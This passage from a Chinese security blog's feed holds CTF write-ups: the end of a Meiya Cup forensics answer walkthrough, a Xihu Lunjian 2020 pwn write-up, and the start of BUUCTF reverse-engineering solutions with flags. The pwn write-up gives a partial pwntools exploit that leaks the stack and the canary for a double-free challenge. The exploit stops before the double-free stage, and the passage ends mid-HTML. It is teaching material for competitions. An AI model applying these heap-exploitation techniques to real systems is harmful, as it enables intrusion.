src="https://i.loli.net/2020/11/09/sx271fmalKLpt6M.png" alt="image.png"></p></blockquote><p>还是火眼里可以直接找出的内容</p><p><img src="https://i.loli.net/2020/11/09/X5x78UW9c2vMLms.png" alt="image.png"></p><h2 id="23-A"><a href="#23-A" class="headerlink" title="23.A"></a>23.A</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/vA3eTsjQbJDKMBn.png" alt="image.png"></p></blockquote><p>这一个在<code>What&#39;s App</code>里的联系人中可以看到</p><p><img src="https://i.loli.net/2020/11/09/o85c7qgdbpsxyQD.png" alt="image.png"></p><h2 id="24-B"><a href="#24-B" class="headerlink" title="24.B"></a>24.B</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/qtSKxc48CAzUghk.png" alt="image.png"></p></blockquote><p>还是在火眼里，粗略翻一翻可以发现除了B以外的都有搜过</p><h2 id="25-E"><a href="#25-E" class="headerlink" title="25.E"></a>25.E</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/Q5unITJ9YRL2woA.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/09/FKmMYRJGLvpyfXr.png" alt="image.png"></p></blockquote><p>还是秒出的<del>混分</del>题，火眼一翻就有</p><p><img src="https://i.loli.net/2020/11/09/K8vH96tISGFyi7u.png" alt="image.png"></p><h2 id="26-B"><a href="#26-B" class="headerlink" title="26.B"></a>26.B</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/1Y5pMoe8EaTzNs3.png" alt="image.png"></p></blockquote><p><del>首先从逻辑上进行分析如果是和老板聊洗钱的话那么在案情简介上就会提到这件事情而且整个案情也会发生变化所以必然没有聊到这个话题</del></p><p>与中介谈买房：</p><p><img src="https://i.loli.net/2020/11/09/y9VFuvHe56CopLQ.png" alt="2020-11-9-20-19.png"></p><p>和 带 黑 阔 进 行 嘿 产 交 易：（后面还会涉及到这个）</p><p><img src="https://i.loli.net/2020/11/09/MJ7VFxysbo56lke.png" alt="image.png"></p><p>与网贷谈借钱：（当程序员也太惨了，没有头发也没有钱QAQ）</p><p><img src="https://i.loli.net/2020/11/09/OEIA8qm3Hxd7TCf.png" alt="image.png"></p><p>与朋友谈炒房：（房价泡沫快破⑧（恼））</p><p><img src="https://i.loli.net/2020/11/09/fjpLDlXOdr4GUkB.png" alt="image.png"></p><p>可以看得出来除了洗钱的内容以外都聊到了</p><h2 id="27-C"><a href="#27-C" class="headerlink" title="27.C"></a>27.C</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/Zux3Pa1jVwpUTdy.png" alt="屏幕截图 2020-11-09 202807.png"></p></blockquote><p>可以在火眼的微信聊天记录里发现<del>才2000条数据就敢出来卖？too young too simple！</del></p><p><img src="https://i.loli.net/2020/11/09/KqoDBJfC3OIwTMQ.png" alt="image.png"></p><h2 id="28-D"><a href="#28-D" class="headerlink" title="28.D"></a>28.D</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/3XuvKxOydTsPpSA.png" alt="image.png"></p></blockquote><p>还是在微信聊天记录里<del>这也太便宜了⑧</del></p><p><img src="https://i.loli.net/2020/11/09/NvstWYFgewRJHBu.png" alt="image.png"></p><h2 id="29-D"><a href="#29-D" class="headerlink" title="29.D"></a>29.D</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/HmdsKoJxvSNQT6g.png" alt="image.png"></p></blockquote><p>这一道题稍微有一丶丶绕，在手机备份里本身的图片是裂图，但是<strong>在电脑镜像中我们可以看到嫌疑人在电脑上也登录过自己的微信</strong>，因此我们重新回电脑镜像里可以看到这个交易的图片</p><p><img src="https://i.loli.net/2020/11/09/nItOfV4wazW9QFP.png" alt="image.png"></p><p>需要注意的是电脑上有多个BTC地址的图片<del>，还好出题人没有屑到两个都放在一个选项里，所以我们可以直接选出来</del></p><p><img src="https://i.loli.net/2020/11/09/Pn369pHERA8WNVy.png" alt=""></p><h2 id="30-E"><a href="#30-E" class="headerlink" title="30.E"></a>30.E</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/Zg1JbciK5flae4N.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/09/MtfLODsUFl6YWTI.png" alt="image.png"></p></blockquote><p>还是在其与  带 嘿 阔  的聊天记录里</p><p><img src="https://i.loli.net/2020/11/09/BAfNIZ5g4EutFLe.png" alt="image.png"></p><h2 id="31-E"><a href="#31-E" class="headerlink" title="31.E"></a>31.E</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/Cul2g3z8yoRq7Vf.png" alt="image.png"></p></blockquote><p>需要注意的是虽然前面的聊天记录里说到密码通过邮箱打过去了，但是后面的聊天记录里我们可以看到的是通过邮箱发过去的密码是错误的，正确的密码还是在其与  带 嘿 阔  的聊天记录里</p><p><img src="https://i.loli.net/2020/11/09/dXOaZvzoENej9BJ.png" alt="image.png"></p><h2 id="32-A"><a href="#32-A" class="headerlink" title="32.A"></a>32.A</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/sHNX3tqrizm9E2p.png" alt="image.png"></p></blockquote><p>很明显就是Kevin<del>没有暗示某社交媒体上某个美🐕的意思</del></p><p><img src="https://i.loli.net/2020/11/09/NvstWYFgewRJHBu.png" alt="image.png"></p><h2 id="33-E"><a href="#33-E" class="headerlink" title="33.E"></a>33.E</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/CsY8PBOtNfFQe7c.png" alt="image.png"></p></blockquote><p>在聊天记录里可以看到是Black Sheep<del>此处艾特black watch</del></p><p><img src="https://i.loli.net/2020/11/09/cF4hnLylwfPQROa.png" alt="image.png"></p><h2 id="34-D？"><a href="#34-D？" class="headerlink" title="34.D？"></a>34.D？</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/C9gOn7Mzs5xHeyE.png" alt="image.png"></p></blockquote><p>（问就是没找到这张图，我菜死了</p><h2 id="35-B"><a href="#35-B" class="headerlink" title="35.B"></a>35.B</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/mGXUtA197D25Khy.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/09/sp4iSQODtCh9bIa.png" alt="image.png"></p></blockquote><p>（问就是没找到这张图，我菜死了</p><h2 id="36-D"><a href="#36-D" class="headerlink" title="36.D"></a>36.D</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/SZDUezQdKshFXpk.png" alt="image.png"></p></blockquote><p>首先在取证大师里我们可以看到有几个加密文件，最下面那个文件名看着比较正常（因为选项中的几个后缀名只匹配到了这一个），跟进到源文件看看</p><p><img src="https://i.loli.net/2020/11/11/CblX3DAkcgUSTBw.png" alt="image.png"></p><p>可以看到是一个用户内部ID为1000的用户放在回收站（$Recycle.Bin）里的文件</p><p><img src="C:%5CUsers%5CSUR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1605107632851.png" alt="1605107632851"></p><p>ID1000就是<code>He Yuan</code>，直接往该用户垃圾桶里翻就能找到文件名了</p><p><img src="https://i.loli.net/2020/11/11/4M6vjQsHLtP5alD.png" alt="image.png"></p><h2 id="37-A"><a href="#37-A" class="headerlink" title="37.A"></a>37.A</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/JWpAoTPSY19dqV2.png" alt="image.png"></p></blockquote><p>在最近访问记录里看到访问了盘符<code>C:</code>与盘符<code>A:</code>，故猜测是挂载到了盘符<code>A:</code>上</p><p><img src="https://i.loli.net/2020/11/11/Vi7IBN5CLHjaPz1.png" alt="image.png"></p><h2 id="38-C"><a href="#38-C" class="headerlink" title="38.C"></a>38.C</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/mTidLSJ9zP62wIk.png" alt="image.png"></p></blockquote><p>在取证结果-&gt;云存储客户端里可以看到应当是<code>Heyuan515</code></p><p><img src="https://i.loli.net/2020/11/11/OXdYwfSJhVkatuR.png" alt="image.png"></p><h2 id="39-A"><a href="#39-A" class="headerlink" title="39.A"></a>39.A</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/7PqVM9lhLSkQjXb.png" alt="image.png"></p></blockquote><p>和上题一样的位置</p><p><img src="https://i.loli.net/2020/11/11/lbR5c1B4o2GU3pT.png" alt="image.png"></p><h2 id="40-C"><a href="#40-C" class="headerlink" title="40.C"></a>40.C</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/WNbYcvM5m3U8oK7.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/09/zmtDBAfQ7cPTwS9.png" alt="image.png"></p></blockquote><p>见百度云管家的文件缓存记录</p><p><img src="https://i.loli.net/2020/11/11/DYpdSlqrWe7E34s.png" alt="image.png"></p><h2 id="41-A"><a href="#41-A" class="headerlink" title="41.A"></a>41.A</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/1hUBcXvpT94ajDG.png" alt="image.png"></p></blockquote><p>可以使用Python计算时间戳（其实我也是现查的</p><p><img src="https://i.loli.net/2020/11/11/35wmUbGJRPfQd2O.png" alt="image.png"></p><blockquote><p>为什么打了个此题无效的标签…可能是因为比赛期间根本没法算⑧（假如不知道这个方法的话</p></blockquote><h2 id="42-B"><a href="#42-B" class="headerlink" title="42.B"></a>42.B</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/qfvOhKmHLcsTNay.png" alt="image.png"></p></blockquote><p>见百度云本地缓存记录，大小0字节的两个是文件夹，剩下的就都是普通文件了</p><p><img src="https://i.loli.net/2020/11/11/91eNkn8YCoTRHVZ.png" alt="image.png"></p><h2 id="43-D"><a href="#43-D" class="headerlink" title="43.D"></a>43.D</h2><blockquote><p><img src="https://i.loli.net/2020/11/11/En1wjSqdrAtpMXP.png" alt="image.png"></p></blockquote><p>在火眼里逐项搜索即可</p><p><img src="https://i.loli.net/2020/11/11/ultfpiSHwseEFM5.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/11/DK23ZgNsk7tWfMm.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/11/oixBzCmy6Vp9nTt.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/11/w8OtIKB6ZMaWvxR.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/12/xCcdTK1mrVg5LJA.png" alt="image.png"></p><h2 id="44-C"><a href="#44-C" class="headerlink" title="44.C"></a>44.C</h2><blockquote><p><img src="https://i.loli.net/2020/11/11/Dn81m94eEYZajhF.png" alt="image.png"></p></blockquote><p>其实在邮件记录里就可以看到一封注册谷歌账号后的默认导航邮件</p><p><img src="https://i.loli.net/2020/11/12/SxfQD9KJzyeR5IL.png" alt="image.png"></p><h2 id="45-B"><a href="#45-B" class="headerlink" title="45.B"></a>45.B</h2><blockquote><p><img src="https://i.loli.net/2020/11/11/eFYlpPkqWbBAZ2f.png" alt="image.png"></p></blockquote><p>在火眼的下载记录里有</p><p><img src="https://i.loli.net/2020/11/12/N4XU6lgK5twFa7k.png" alt="image.png"></p><h2 id="46-D"><a href="#46-D" class="headerlink" title="46.D"></a>46.D</h2><blockquote><p><img src="https://i.loli.net/2020/11/11/sPOxJM6n4Aj7oUy.png" alt="image.png"></p></blockquote><p>几个浏览器历史记录搜一遍过去就有了</p><p><img src="https://i.loli.net/2020/11/12/GWU4FzwdAcPlOiK.png" alt="image.png"></p><h2 id="47"><a href="#47" class="headerlink" title="47."></a>47.</h2><blockquote><p><img src="https://i.loli.net/2020/11/11/OlfGyKMQYFojTtL.png" alt="image.png"></p></blockquote><p>首先了解Tor浏览器相关知识：</p><p><img src="https://i.loli.net/2020/11/12/sEf83JlrpXxmFGd.png" alt="image.png"></p><p>Tor是<strong>基于火狐浏览器修改而成</strong>的，而火狐浏览器的历史记录存留在数据库<code>places.sqlite</code>里</p><p><img src="https://i.loli.net/2020/11/12/RkxNKzdy2VrYeXM.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/12/gyoFnpQSETfYeqr.png" alt="image.png"></p><p>查找<code>places.sqlite</code>文件，将tor目录下的那一个提取出来，</p><p><img src="https://i.loli.net/2020/11/12/6ch2D7UedZ1zTXC.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/12/s3qhyMTjroVJHip.png" alt="image.png"></p><h2 id="48"><a href="#48" class="headerlink" title="48."></a>48.</h2><blockquote><p><img src="https://i.loli.net/2020/11/11/EF71hTnZwIstBmY.png" alt="image.png"></p></blockquote><h2 id="49"><a href="#49" class="headerlink" title="49."></a>49.</h2><blockquote><p><img src="https://i.loli.net/2020/11/11/N84mEQvSy1FBtIi.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/11/ASXw5o7KyJrONdv.png" alt="image.png"></p></blockquote><h2 id="50"><a href="#50" class="headerlink" title="50."></a>50.</h2><blockquote><p><img src="https://i.loli.net/2020/11/11/FcLhpMiS82VQ1Rv.png" alt="image.png"></p></blockquote><h2 id="51"><a href="#51" class="headerlink" title="51."></a>51.</h2><blockquote><p><img src="https://i.loli.net/2020/11/11/64FCv1pLeJTQtEc.png" alt="image.png"></p></blockquote><p>为了准备今年的美亚杯，清理硬盘空间的过程中一不小心把内存镜像删了，明天重新拷一份回来再看看…</p><h2 id="52"><a href="#52" class="headerlink" title="52."></a>52.</h2><blockquote><p><img src="https://i.loli.net/2020/11/11/nBvW316efH52plM.png" alt="image.png"></p></blockquote><h2 id="53"><a href="#53" class="headerlink" title="53."></a>53.</h2><blockquote><p><img src="https://i.loli.net/2020/11/11/E1X25UwRCvebkLF.png" alt="image.png"></p></blockquote><h2 id="54"><a href="#54" class="headerlink" title="54."></a>54.</h2><blockquote></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-绪论&quot;&gt;&lt;a href=&quot;#0x00-绪论&quot; class=&quot;headerlink&quot; title=&quot;0x00.绪论&quot;&gt;&lt;/a&gt;0x00.绪论&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://meiyacup.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;“美亚杯”中国电子数据取证大赛&lt;/a&gt;是由&lt;strong&gt;中国刑事警察学院主办、厦门美亚柏科承办的中国电子数据取证大赛&lt;/strong&gt;，也是国内较为有名的数据取证比赛&lt;/p&gt;
&lt;p&gt;作为网安专业的小萌新去年对此毫不知情（&lt;del&gt;知情了我可能也过不了资格赛&lt;/del&gt;），于是今年想要去玩玩（&lt;del&gt;指划水&lt;/del&gt;），所以打算趁时间还够把过去的几次比赛的真题给刷一刷XD&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注：题目版权属于美亚杯赛事组委会&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="电子取证" scheme="http://archive.next.arttnba3.cn/categories/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/"/>
    
    
    <category term="电子取证" scheme="http://archive.next.arttnba3.cn/tags/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/"/>
    
    <category term="美亚杯" scheme="http://archive.next.arttnba3.cn/tags/%E7%BE%8E%E4%BA%9A%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>【CTF题解-0x07】西湖论剑2020 write up by arttnb3</title>
    <link href="http://archive.next.arttnba3.cn/2020/10/09/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x07%E3%80%91%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020-write-up-by-arttnb3/"/>
    <id>http://archive.next.arttnba3.cn/2020/10/09/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x07%E3%80%91%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020-write-up-by-arttnb3/</id>
    <published>2020-10-09T11:18:03.000Z</published>
    <updated>2020-12-16T11:43:08.508Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><blockquote><p>新技术在快速迭代更新，要求网络安全从业者必须与时俱进、不断学习，在实战中锻炼技艺，以往的竞赛模式已满足不了贴合实战的竞赛需求。</p><p>2020第四届中国杭州网络安全技能大赛以“人才：应对网络安全新变局”为主题，推陈出新、聚焦品质，力求创新、实战化，让参赛者学有所成，为国家网络安全队伍建设，聚集真正有实战能力的人才。大赛总奖金池高达数百万元，丰厚奖励激励优秀人才！</p><p><a href="https://game-pc.gcsis.cn" target="_blank" rel="noopener">第四届西湖论剑网络安全技能大赛</a></p></blockquote><p>简单来说就是一个大佬云集的比赛，本菜鸡只是蹭了蹭协会的号参观了一哈（虽然说当天其实没写出来题XD</p><p>当然baby pwner只会pwn，所以下面的都是pwn题题解</p><a id="more"></a><blockquote><p>注：原题皆可在本页面下载</p></blockquote><h1 id="0x01-Pwn"><a href="#0x01-Pwn" class="headerlink" title="0x01.Pwn"></a>0x01.Pwn</h1><h2 id="0x00-mmutag-double-free-one-gadget"><a href="#0x00-mmutag-double-free-one-gadget" class="headerlink" title="0x00.mmutag - double free + one_gadget"></a>0x00.mmutag - double free + one_gadget</h2><p><a href="/download/xhlj2020/mmutag/mmutag">点击下载 - mmutag</a></p><p><a href="/download/xhlj2020/mmutag/libc.so.6">点击下载 - libc.so.6</a></p><p>惯例的<code>checksec</code>，发现开了NX保护和canary</p><p><img src="https://i.loli.net/2020/10/14/4IYR8gap7NmwrJC.png" alt="image.png"></p><p>拖入IDA进行分析（部分变量函数名经重命名</p><p>首先我们可以看到该程序在开头泄露了一个栈上地址给我们</p><p><img src="https://i.loli.net/2020/10/14/cqejAENTQtuBsbJ.png" alt="image.png"></p><p>我们可以发现该程序新分配的堆块大小都为<code>0x80</code>，在fastbin范围内</p><p><img src="https://i.loli.net/2020/10/14/t1WmaRzxOwTG8j4.png" alt="image.png"></p><p>同时我们可以发现在程序释放堆块时并未将堆表指针置0，存在<strong>use after free</strong>漏洞，利用这个漏洞我们便可以进行double free；题目给的libc是2.23的，没有tcache，故考虑fastbin attack</p><p><img src="https://i.loli.net/2020/10/14/3BpvnsDoeHtNZbS.png" alt="image.png"></p><p>同时在堆表操作页面我们发现可以通过选项<code>3</code>进行<strong>partial overwrite</strong>以<strong>泄露canary的值</strong></p><p><img src="https://i.loli.net/2020/10/14/dzRfrx62jquUGMi.png" alt="image.png"></p><p>故考虑通过double free进行任意地址写：构造fake chunk修改主函数的返回地址为one_gadget以getshell</p><p>故构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./mmutag'</span>)</span><br><span class="line">e = ELF(<span class="string">'./mmutag'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_intro</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b'please input your choice:\n\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">b'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'please input your introduce \n'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">heap_menu</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b'please input your choice:\n\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">b'2'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(index:int,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b'please input your choise:\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">b'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'please input your id:\n'</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b'input your content\n'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">b'OK!\n'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b'please input your choise:\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">b'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'please input your id:\n'</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b'OK!\n'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_content</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b'please input your choise:\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">b'3'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go_back</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b'please input your choise:\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">b'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak stack addr</span></span><br><span class="line">p.recvuntil(<span class="string">b'please input you name: '</span>)</span><br><span class="line">p.sendline(<span class="string">b'arttnba3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">b'this is your tag: '</span>)</span><br><span class="line">stack_leak = int(p.recvuntil(<span class="string">':'</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>),<span class="number">16</span>)</span><br><span class="line">print(<span class="string">'[*]stack value leak:'</span> + hex(stack_leak))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak canary</span></span><br><span class="line">payload1 = <span class="string">b'A'</span>*<span class="number">0x18</span></span><br><span class="line">write_content(payload1)</span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#double free</span></span><br></pre></td></tr></table></figure><blockquote><p> 一开始做的时候漏看了一个取地址符，导致我以为开头泄露的是堆基址…</p><p>以后做题还是要细心些XDD</p></blockquote><blockquote><p>注：以下为当天的队内交流信息</p><p>以及赤道🐧师傅yyds</p><p><img src="https://i.loli.net/2020/10/14/UmWaVKtJQTEe9qD.png" alt="image.png"></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-绪论&quot;&gt;&lt;a href=&quot;#0x00-绪论&quot; class=&quot;headerlink&quot; title=&quot;0x00.绪论&quot;&gt;&lt;/a&gt;0x00.绪论&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;新技术在快速迭代更新，要求网络安全从业者必须与时俱进、不断学习，在实战中锻炼技艺，以往的竞赛模式已满足不了贴合实战的竞赛需求。&lt;/p&gt;
&lt;p&gt;2020第四届中国杭州网络安全技能大赛以“人才：应对网络安全新变局”为主题，推陈出新、聚焦品质，力求创新、实战化，让参赛者学有所成，为国家网络安全队伍建设，聚集真正有实战能力的人才。大赛总奖金池高达数百万元，丰厚奖励激励优秀人才！&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://game-pc.gcsis.cn&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;第四届西湖论剑网络安全技能大赛&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;简单来说就是一个大佬云集的比赛，本菜鸡只是蹭了蹭协会的号参观了一哈（虽然说当天其实没写出来题XD&lt;/p&gt;
&lt;p&gt;当然baby pwner只会pwn，所以下面的都是pwn题题解&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="堆" scheme="http://archive.next.arttnba3.cn/tags/%E5%A0%86/"/>
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/tags/CTF/"/>
    
    <category term="one_gadget" scheme="http://archive.next.arttnba3.cn/tags/one-gadget/"/>
    
    <category term="double free" scheme="http://archive.next.arttnba3.cn/tags/double-free/"/>
    
    <category term="partial overwrite" scheme="http://archive.next.arttnba3.cn/tags/partial-overwrite/"/>
    
  </entry>
  
  <entry>
    <title>【CTF题解-0x06】BUUCTF-Reverse write up by arttnb3</title>
    <link href="http://archive.next.arttnba3.cn/2020/10/09/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x06%E3%80%91BUUCTF-Reverse-write-up-by-arttnb3/"/>
    <id>http://archive.next.arttnba3.cn/2020/10/09/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x06%E3%80%91BUUCTF-Reverse-write-up-by-arttnb3/</id>
    <published>2020-10-09T06:15:13.000Z</published>
    <updated>2020-12-01T15:44:14.926Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x000-绪论"><a href="#0x000-绪论" class="headerlink" title="0x000.绪论"></a>0x000.绪论</h1><blockquote><p><a href="buuoj.cn">BUUCTF</a>是一个巨型CTF题库，大致可以类比OIer们的洛谷一样的地方，在BUUCTF上有着分类齐全数量庞大的各方向题目，包括各大CTF的原题</p><p>正所谓”不刷BUU非CTFer“（<del>哪里有过这种奇怪的话啦</del>），作为一名新晋的蒟蒻CTFer&amp;网安专业选手，咱也来做一做BUUCTF上的题，并把题解在博客上存档一份方便后来者学习（<del>快醒醒，哪里会有人看你的博客啦XD</del></p><p>Baby Pwner做的都是pwn题，点开即可查看题解</p></blockquote><p>👆在第一篇BUU的题解中我曾经这么说过，但是作为研究二进制安全的新手，同时也作为Baby Pwner，深深地感受到了逆向功底的重要性</p><p>为了巩固自己的逆向功底，提高代码审计的功力，今天开始也并行刷一刷Reverse</p><a id="more"></a><blockquote><p><del>但愿肝有事，不然岂不是等于一直在划水</del></p></blockquote><h1 id="0x001-easyre"><a href="#0x001-easyre" class="headerlink" title="0x001.easyre"></a>0x001.easyre</h1><p>拖入IDA中就有flag了</p><p><img src="https://i.loli.net/2020/10/09/feVgh943dJCawl2.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;this_Is_a_EaSyRe&#125;</span><br></pre></td></tr></table></figure><h1 id="0x002-reverse1"><a href="#0x002-reverse1" class="headerlink" title="0x002.reverse1"></a>0x002.reverse1</h1><p>拖入IDA进行分析</p><p>存在一个可疑的用括号包着的字符串<code>{hello_world}</code></p><p><img src="https://i.loli.net/2020/10/09/XEvUVFzTgMCedk2.png" alt="image.png"></p><p>同时我们可以发现程序会把该字符串中的<code>&#39;o&#39;</code>替换成<code>&#39;0&#39;</code></p><p><img src="https://i.loli.net/2020/10/09/jGMscx5D7PLImuU.png" alt="image.png"></p><p>故得flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hell0_w0rld&#125;</span><br></pre></td></tr></table></figure><h1 id="0x003-reverse2"><a href="#0x003-reverse2" class="headerlink" title="0x003.reverse2"></a>0x003.reverse2</h1><p>拖入IDA进行分析</p><p>有个可疑字符串<code>{hacking_for_fun}</code></p><p><img src="https://i.loli.net/2020/12/01/tfOhcsRFU5dJZwW.png" alt="image.png"></p><p>main函数中会进行置换，将<code>i</code>和<code>r</code>都换成<code>1</code></p><p><img src="https://i.loli.net/2020/12/01/xn2mXQ4hSOJGRpc.png" alt="image.png"></p><p>故得flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hack1ng_fo1_fun&#125;</span><br></pre></td></tr></table></figure><h1 id="0x004-内涵的软件"><a href="#0x004-内涵的软件" class="headerlink" title="0x004.内涵的软件"></a>0x004.内涵的软件</h1><p>拖入IDA就有flag</p><p><img src="https://i.loli.net/2020/12/01/SYAMrylVujwUsx2.png" alt="image.png"></p><p>需要注意的是把<code>DBAPP</code>换成<code>flag</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;49d3c93df25caad81232130f3d2ebfad&#125;</span><br></pre></td></tr></table></figure><h1 id="0x005-新年快乐-UPX"><a href="#0x005-新年快乐-UPX" class="headerlink" title="0x005.新年快乐 - UPX"></a>0x005.新年快乐 - UPX</h1><p>惯例的拖入IDA，发现<strong>啥都没有</strong>，推测是加了壳</p><p><img src="https://i.loli.net/2020/12/01/6shVrWOb4eo57ml.png" alt="image.png"></p><p>脱壳以后就可以在IDA中直接得到flag了</p><p><img src="https://i.loli.net/2020/12/01/mf56nyOzsKcq1lB.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/12/01/ovdKZlGnibcYCBX.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 